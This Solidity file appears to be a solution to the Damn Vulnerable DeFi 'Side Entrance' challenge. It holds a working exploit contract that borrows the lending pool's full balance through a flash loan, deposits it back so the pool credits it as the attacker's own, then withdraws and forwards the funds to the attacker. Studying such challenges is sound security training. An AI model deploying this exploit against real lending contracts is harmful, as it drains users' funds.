// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
 import "@openzeppelin/contracts/utils/Address.sol";

 interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}
contract SideAttack {
    address pool;
    uint256 balance;
    constructor(address _pool){
        pool = _pool;
    }
    using Address for address payable;
    function attack(address attacker) external{
        balance = address(pool).balance;
        ISideEntranceLenderPool(pool).flashLoan(balance);
        ISideEntranceLenderPool(pool).withdraw();
        payable(attacker).sendValue(address(this).balance);
    }
  
    function execute() external payable{
        ISideEntranceLenderPool(pool).deposit{value:balance}();
    }

    receive () external payable {}

}